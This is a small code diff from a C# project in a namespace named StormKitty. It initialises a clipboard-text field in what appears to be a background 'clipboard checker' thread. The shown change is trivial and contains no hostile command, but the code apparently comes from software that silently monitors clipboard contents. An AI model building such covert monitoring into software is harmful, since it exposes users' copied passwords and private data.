@@ -6,7 +6,7 @@ namespace StormKitty
     {
         // Current clipboard content
         public static string PrevClipboard = "";
-        public static string ClipboardText;
+        public static string ClipboardText = "";
         public static Thread MainThread = new Thread(Run);
 
         // Run clipboard checker
